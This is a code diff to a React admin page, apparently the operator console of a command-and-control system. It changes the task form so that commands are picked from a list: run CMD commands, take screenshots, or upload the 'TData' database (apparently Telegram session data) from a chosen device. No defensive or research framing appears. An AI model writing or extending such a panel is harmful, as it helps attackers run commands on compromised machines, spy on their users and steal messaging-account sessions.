@@ -1,6 +1,6 @@
 import { listC2TaskVoByPageUsingPost, addC2TaskUsingPost, deleteC2TaskUsingPost } from '@/services/backend/c2TaskController';
 import type { ActionType, ProColumns } from '@ant-design/pro-components';
-import { PageContainer, ProTable, ModalForm, ProFormText, ProFormTextArea } from '@ant-design/pro-components';
+import { PageContainer, ProTable, ModalForm, ProFormSelect, ProFormText, ProFormTextArea } from '@ant-design/pro-components';
 import '@umijs/max';
 import { Button, message, Tag } from 'antd';
 import React, { useRef, useState } from 'react';
@@ -181,16 +181,21 @@ const C2TaskPage: React.FC = () => {
           name="deviceId"
           placeholder="请输入设备ID (可选)"
         />
-        <ProFormText
+        <ProFormSelect
+          label="命令"
+          name="command"
           rules={[
             {
               required: true,
-              message: '命令不能为空',
+              message: '请选择命令',
             },
           ]}
-          label="命令"
-          name="command"
-          placeholder="cmd_exec / screenshot / upload_db"
+          valueEnum={{
+            cmd_exec: '执行CMD命令',
+            screenshot: '屏幕截图',
+            upload_db: '上传TData数据库',
+          }}
+          placeholder="请选择命令"
         />
         <ProFormTextArea
           label="参数"
